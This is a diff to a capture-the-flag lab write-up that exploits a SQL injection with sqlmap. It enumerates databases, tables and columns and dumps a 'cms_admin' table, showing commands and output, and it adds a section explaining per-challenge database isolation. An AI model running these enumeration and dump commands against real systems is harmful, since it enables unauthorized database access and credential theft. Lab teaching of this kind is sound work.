@@ -144,48 +144,43 @@ sqlmap -r req.txt -p id --batch --ignore-stdin --dbs
 ```
 available databases [2]:
 [*] information_schema
-[*] seiyaku
+[*] seiyaku_p2_sealed
 ```
 
-### Step 3, enumerate tables in `seiyaku`
+Only this floor's own database is visible. Each challenge runs in its own
+database behind its own restricted user, so the account this injection
+runs through cannot see any other floor's database (see the Isolation
+note at the end). There is no shared `seiyaku` schema here.
+
+### Step 3, enumerate tables in `seiyaku_p2_sealed`
 
 ```
-sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku --tables
+sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku_p2_sealed --tables
 ```
 
 ```
-Database: seiyaku
-[13 tables]
-+--------------+
-| applicants   |
-| cms_admin    |
-| cms_news     |
-| cms_pages    |
-| door         |
-| floors       |
-| keeper       |
-| patients     |
-| records      |
-| results      |
-| staff        |
-| vault        |
-| vault_floors |
-+--------------+
+Database: seiyaku_p2_sealed
+[3 tables]
++-----------+
+| cms_admin |
+| cms_news  |
+| cms_pages |
++-----------+
 ```
 
-`cms_news` and `cms_pages` back this floor's own display pages,
+`cms_news` and `cms_pages` back this floor's own display pages;
 `cms_admin` is the one name this route's own code never selects from or
-joins against. Everything else here belongs to earlier floors across
-the exam.
+joins against, which is exactly why it's the interesting one. All three
+belong to this floor, nothing from any other challenge is reachable.
 
 ### Step 4, enumerate columns of `cms_admin`
 
 ```
-sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku -T cms_admin --columns
+sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku_p2_sealed -T cms_admin --columns
 ```
 
 ```
-Database: seiyaku
+Database: seiyaku_p2_sealed
 Table: cms_admin
 [3 columns]
 +---------------+--------------+
@@ -206,9 +201,9 @@ sqlmap -r req.txt -p id --batch --ignore-stdin --dump -T cms_admin
 ```
 [13:41:16] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
 [13:41:16] [INFO] fetching current database
-[13:41:16] [INFO] fetching columns for table 'cms_admin' in database 'seiyaku'
-[13:41:16] [INFO] fetching entries for table 'cms_admin' in database 'seiyaku'
-Database: seiyaku
+[13:41:16] [INFO] fetching columns for table 'cms_admin' in database 'seiyaku_p2_sealed'
+[13:41:16] [INFO] fetching entries for table 'cms_admin' in database 'seiyaku_p2_sealed'
+Database: seiyaku_p2_sealed
 Table: cms_admin
 [1 entry]
 +----+----------+--------------------------------+
@@ -289,3 +284,17 @@ danger that accumulates in anything old enough to be forgotten about.
   needs means a successful injection in one old, forgotten module still
   can't reach a table like `cms_admin` that its own legitimate queries
   never touch.
+
+## Isolation
+
+This floor lives in its own database (`seiyaku_p2_sealed`) and connects
+as its own restricted user (`svc_p2_sealed`), granted access to nothing
+else. That is why `--dbs` and `--tables` above returned only this floor's
+own database and its three tables: `information_schema` is filtered by
+the connecting user's privileges, so other challenges' tables are
+invisible, not just unreferenced, and cross-database reads or `USE` of
+another challenge's database are denied outright. `cms_admin` is still
+reachable here because it lives in *this* challenge's own database
+alongside `cms_news`/`cms_pages`, that within-challenge exposure is the
+whole lesson; what you cannot do is reach any *other* challenge's tables.
+(Every MariaDB-backed challenge in the lab is isolated the same way.)
